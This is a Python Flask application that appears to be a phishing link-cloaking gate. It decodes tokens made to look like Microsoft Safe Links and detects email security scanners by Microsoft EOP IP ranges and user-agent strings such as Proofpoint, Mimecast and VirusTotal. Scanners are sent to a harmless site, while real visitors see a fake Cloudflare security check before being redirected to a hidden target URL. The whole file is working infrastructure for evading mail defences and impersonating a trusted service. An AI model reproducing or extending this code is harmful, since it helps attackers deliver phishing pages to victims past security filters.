import os
import time
import json
import secrets
import base64
import logging
from ipaddress import ip_address, ip_network
from urllib.parse import quote

from flask import (
    Flask, request, redirect, render_template_string,
    make_response, jsonify,
)
from itsdangerous import URLSafeTimedSerializer

# ---------------------------------------------------------------------------
# config
# ---------------------------------------------------------------------------
SK = os.environ.get("SECRET_KEY", "7b311b50f8306ae1fbe13f4db9b030267f77f3cc0020889b8cb583895afb443e")
GATE_TTL = int(os.environ.get("GATE_TTL_SECONDS", "900"))
UNWANTED_REDIRECT_URL = os.environ.get("UNWANTED_REDIRECT_URL", "https://www.google.com")

app = Flask(__name__)
app.secret_key = SK.encode()
cookie_serializer = URLSafeTimedSerializer(app.secret_key, salt="cookie-gate")

logging.basicConfig(level=logging.INFO)
log = logging.getLogger("link-gate")

# ---------------------------------------------------------------------------
# scanner networks
# ---------------------------------------------------------------------------
EOP = [ip_network("40.92.0.0/15"), ip_network("40.107.0.0/16"), ip_network("52.100.0.0/14"), ip_network("104.47.0.0/17"), ip_network("13.107.6.152/31"), ip_network("13.107.18.10/31"), ip_network("13.107.128.0/22"), ip_network("23.103.160.0/20")]
SCANNER_NETS = {"microsoft_eop": EOP}

SCANNER_UA_TOKENS = ("microsoft office", "safelinks", "proofpoint", "mimecast", "barracuda", "talos", "urlscan", "virustotal", "curl/", "wget/", "python-requests")

def client_ip() -> str:
    xff = request.headers.get("X-Forwarded-For", "")
    return xff.split(",")[0].strip() if xff else request.remote_addr or ""

def classify(ip: str, ua: str) -> dict:
    out = {"scanner": False, "source": None}
    low = ua.lower()
    try:
        a = ip_address(ip)
        for name, nets in SCANNER_NETS.items():
            if any(a in n for n in nets):
                out["scanner"] = True
                out["source"] = name
                return out
    except ValueError:
        pass

    for tok in SCANNER_UA_TOKENS:
        if tok in low:
            out["scanner"] = True
            out["source"] = tok
            return out
    return out

def parse_payload_from_eop(eop_string):
    if not eop_string.startswith("u001."): return None
    try:
        clean = eop_string[5:].replace("-3D-3D", "").replace("-2F", "").replace("-3D", "").replace("-3A", "").replace("-2B", "")
        b64_payload = clean.split("-")[-1]
        padding = '=' * (-len(b64_payload) % 4)
        return json.loads(base64.urlsafe_b64decode(b64_payload + padding).decode('utf-8'))
    except Exception:
        return None

def _static_page(title: str, text: str, status_code: int):
    html = f"<html><body><h1>{title}</h1><p>{text}</p></body></html>"
    return make_response(html, status_code)

# ---------------------------------------------------------------------------
# THE DUMMY CLOUDFLARE HTML WITH CSS
# ---------------------------------------------------------------------------
LANDING = """<!DOCTYPE html>
<html lang="en-US">
  <head>
    <style>
      .h1, .h2 { font-weight: 500; }
      * { box-sizing: border-box; margin: 0; padding: 0; }
      html { line-height: 1.15; -webkit-text-size-adjust: 100%; color: #313131; }
      button, html { font-family: system-ui, -apple-system, BlinkMacSystemFont, Segoe UI, Roboto, Helvetica Neue, Arial, Noto Sans, sans-serif; }
      body { display: flex; flex-direction: column; min-height: 100vh; }
      a { transition: color 0.15s; text-decoration: none; color: #0051c3; }
      a:hover { text-decoration: underline; color: #ee730a; }
      .main-content { margin: 8rem auto; width: 100%; max-width: 60rem; }
      .main-wrapper { display: flex; flex: 1; flex-direction: column; align-items: center; }
      .h1 { line-height: 3.75rem; font-size: 2.5rem; }
      .core-msg, .h2 { line-height: 2.25rem; font-size: 1.5rem; }
      .footer { margin: 0 auto; width: 100%; max-width: 60rem; line-height: 1.125rem; font-size: 0.75rem; padding: 0 1.5rem; }
      .footer-inner { border-top: 1px solid #d9d9d9; padding-top: 1rem; padding-bottom: 1rem; }
      .text-center { text-align: center; }
      .zone-name-title { overflow-wrap: break-word; margin-bottom: 1rem; }
      .loading-spinner { height: 76.391px; }
      .lds-ring, .lds-ring div { width: 1.875rem; height: 1.875rem; }
      .lds-ring { display: inline-block; position: relative; }
      .lds-ring div { box-sizing: border-box; position: absolute; border: 0.3rem solid #595959; border-radius: 50%; border-color: #595959 transparent transparent; animation: 1.2s cubic-bezier(0.5, 0, 0.5, 1) infinite lds-ring; }
      .lds-ring div:first-child { animation-delay: -0.45s; }
      .lds-ring div:nth-child(2) { animation-delay: -0.3s; }
      .lds-ring div:nth-child(3) { animation-delay: -0.15s; }
      @keyframes lds-ring { 0% { transform: rotate(0); } to { transform: rotate(360deg); } }
      .fact { border: 0.063rem solid #d9d9d9; border-radius: 0.313rem; padding: 1rem; }
      .fact .fact-title { font-weight: 500; }
      .spacer { margin: 2rem 0; }
      .hidden { display: none; }
      .core-msg { font-weight: 400; }
      .body-text { line-height: 1.25rem; font-size: 1rem; font-weight: 400; }
      .expandable { transition: height, border-left 0.2s; border-left: 0.125rem solid #e5e5e5; padding-left: 0.5rem; }
      .expandable-summary-btn { border: none; background: none; cursor: pointer; padding: 0; font: inherit; }
      #footer-request-button { border-radius: 0; color: #e8e6e3; width: 396px; height: 70px; background: #2c7cb0; display: flex; align-items: center; justify-content: center; margin: 0 auto; border: 0; font-size: 24px; cursor: pointer; }
      #footer-request-button > span { color: #fff; }
    </style>
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
    <script src="https://www.google.com/recaptcha/api.js" async defer></script>

    <title>Just a moment...</title>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
    <meta name="robots" content="noindex,nofollow" />
    <meta name="viewport" content="width=device-width,initial-scale=1" />
  </head>

  <body class="no-js">
    <div class="main-wrapper" role="main">
      <div class="main-content">
        <h1 class="zone-name-title h1">
          <div>
            <img class="" src="https://cloudflare.com/favicon.ico" style="margin-bottom: -17px" onerror="this.onerror=null;this.parentNode.removeChild(this)" />
            <div id="site-name">Cloudflare</div>
          </div>
        </h1>
        <h2 class="h2" id="challenge-running">Checking if the site connection is secure</h2>
        
        <!-- The Real Form requires action and hidden inputs to submit to Flask -->
        <form action="{{ action }}" method="POST" id="challenge-form">
          <!-- Dummy ReCaptcha (using Google's test key) -->
          <div class="g-recaptcha" data-sitekey="6LeIxAcTAAAAAJcZVRqyHh71UMIEGNQ_MXjiZKhI" data-callback="EnterSite"></div>
          <br />
          
          <input type="hidden" name="n" value="{{ nonce }}">
          <input type="hidden" name="t" value="{{ token }}">
          
          <input type="submit" id="footer-request-button" class="button button-large footer-request-wrapper" value="Submit" style="display: none" />
          <br />
        </form>
        
        <div id="challenge-body-text" class="core-msg spacer">
          <div id="site-name" style="float: left; margin-left: 10px; margin-right: 10px">Cloudflare</div>
          <div style="margin: 10px">needs to review the security of your connection before proceeding.</div>
        </div>
      </div>
    </div>
    <script>
      function EnterSite() {
        // When the user clicks the checkbox, submit the form to Flask
        document.getElementById("challenge-form").submit();
      }
      
      window.addEventListener("load", () => {
        document.getElementById("footer-request-button").addEventListener("click", function (e) {
          e.preventDefault()
          document.getElementById("footer-request-button").style.display = "none"
          document.getElementById("challenge-running").insertAdjacentHTML("afterend", '<div id="challenge-spinner" class="spacer loading-spinner" style="display: block; visibility: visible;"><div class="lds-ring"><div></div><div></div><div></div><div></div></div></div>')
          document.getElementById("challenge-body-text").insertAdjacentHTML("afterend", '<div id="challenge-fact-wrapper" class="fact spacer hidden" style="display: block;"><span class="fact-title">Did you know</span> <span id="challenge-fact" class="body-text">the first botnet in 2003 took over 500-1000 devices? Today, botnets take over millions of devices at once.</span></div>')
        })
      })
    </script>

    <div class="footer" role="contentinfo">
      <div class="footer-inner">
        <div class="text-center">
          Performance &amp; security by <a rel="noopener noreferrer" href="https://www.cloudflare.com" target="_blank">Cloudflare</a>
        </div>
      </div>
    </div>
  </body>
</html>"""

@app.route("/ls/<path:token>", methods=["GET"])
def landing(token: str):
    if not token.startswith("click_upn="):
        return _static_page("Invalid link", "This link is not valid.", 404)
        
    eop_token = token.replace("click_upn=", "")
    data = parse_payload_from_eop(eop_token)
    
    if not data or "target" not in data:
        return _static_page("Invalid link", "Could not parse target.", 404)

    tag = classify(client_ip(), request.headers.get("User-Agent", ""))
    if tag["scanner"]:
        return redirect(data.get("unwanted", UNWANTED_REDIRECT_URL), code=302)

    nonce_payload = {"t": eop_token, "ts": time.time()}
    nonce_blob = cookie_serializer.dumps(nonce_payload)

    html = render_template_string(LANDING, action=f"/submit/{quote(eop_token)}", token=eop_token, nonce=nonce_blob)
    resp = make_response(html)
    
    is_https = (request.headers.get("X-Forwarded-Proto", "http") == "https" or request.is_secure)
    resp.set_cookie("gate_session", nonce_blob, max_age=GATE_TTL, httponly=True, secure=is_https, samesite="None", path="/")
    return resp

@app.route("/submit/<path:token>", methods=["POST"])
def execute(token: str):
    tag = classify(client_ip(), request.headers.get("User-Agent", ""))
    if tag["scanner"]:
        return redirect(UNWANTED_REDIRECT_URL, code=302)

    submitted_blob = request.form.get("n", "")
    if not submitted_blob:
        return _static_page("Missing Context", "Verification payload missing.", 400)

    try:
        nonce_data = cookie_serializer.loads(submitted_blob, max_age=GATE_TTL)
    except:
        return _static_page("Session Expired", "Verification context expired.", 400)

    if not secrets.compare_digest(nonce_data.get("t", ""), token):
        return _static_page("Verification Failed", "Verification payload mismatched.", 400)

    data = parse_payload_from_eop(token)
    if not data or "target" not in data:
         return _static_page("Invalid link", "Could not parse target.", 404)

    resp = make_response(redirect(data["target"], code=303))
    resp.delete_cookie("gate_session", path="/")
    return resp

@app.route("/health")
def health(): return jsonify({"ok": True})

if __name__ == "__main__":
    app.run(host="127.0.0.1", port=5000, debug=True)
